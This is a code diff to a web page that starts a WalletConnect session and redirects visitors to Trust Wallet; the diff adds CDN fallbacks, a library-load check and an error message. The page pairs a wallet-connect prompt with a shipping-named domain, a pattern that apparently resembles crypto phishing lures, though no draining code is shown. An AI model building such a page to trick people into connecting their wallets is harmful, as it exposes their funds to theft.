@@ -61,9 +61,31 @@
             display: none;
             margin-top: 20px;
         }
+        .error {
+            color: #ffcccb;
+            background: rgba(255,0,0,0.2);
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 15px;
+        }
     </style>
-    <!-- WalletConnect v2 library -->
+    <!-- Try multiple CDNs for WalletConnect -->
     <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
+    <script>
+        // Fallback if library not loaded after 2 seconds
+        window.libLoaded = false;
+        function checkLibrary() {
+            if (typeof window.EthereumProvider !== 'undefined') {
+                window.libLoaded = true;
+                console.log('✅ WalletConnect library loaded');
+            } else {
+                document.getElementById('errorMsg').innerText = '❌ Failed to load WalletConnect library. Please check your internet or try again later.';
+                document.getElementById('connectBtn').disabled = true;
+            }
+        }
+        setTimeout(checkLibrary, 2000);
+    </script>
 </head>
 <body>
     <div class="container">
@@ -72,6 +94,7 @@
         <p style="font-size:14px; word-break:break-all;">https://express-shipping-mcu1.onrender.com</p>
         <button class="button" id="connectBtn">Connect Now</button>
         <div id="loading">⏳ Generating connection request...</div>
+        <div id="errorMsg" class="error"></div>
         <p class="note">If Trust Wallet is not installed, you'll be redirected to the app store.</p>
     </div>
 
@@ -80,6 +103,11 @@
         const RPC_URL = "https://express-shipping-mcu1.onrender.com";
 
         document.getElementById('connectBtn').addEventListener('click', async () => {
+            if (!window.libLoaded) {
+                alert('Library not loaded yet. Please wait a moment and try again.');
+                return;
+            }
+
             const btn = document.getElementById('connectBtn');
             const loading = document.getElementById('loading');
             btn.disabled = true;
@@ -87,10 +115,6 @@
             loading.style.display = 'block';
 
             try {
-                if (typeof window.EthereumProvider === 'undefined') {
-                    throw new Error('WalletConnect library not loaded. Please refresh.');
-                }
-
                 // Initialize provider without showing modal
                 const provider = await window.EthereumProvider.init({
                     projectId: PROJECT_ID,
@@ -109,7 +133,6 @@
                 // Wait for the URI
                 const uri = await new Promise((resolve) => {
                     provider.once('display_uri', resolve);
-                    // Trigger connection
                     provider.connect().catch(() => {});
                 });
 
@@ -117,10 +140,9 @@
                 const trustLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
                 window.location.href = trustLink;
 
-                // Fallback: if not opened after 2 seconds, show QR option
+                // Fallback if not opened
                 setTimeout(() => {
                     if (!document.hidden) {
-                        // Still on page, maybe deep link failed
                         alert('If Trust Wallet did not open, tap the button again or install Trust Wallet from the app store.');
                         btn.disabled = false;
                         btn.textContent = 'Try Again';
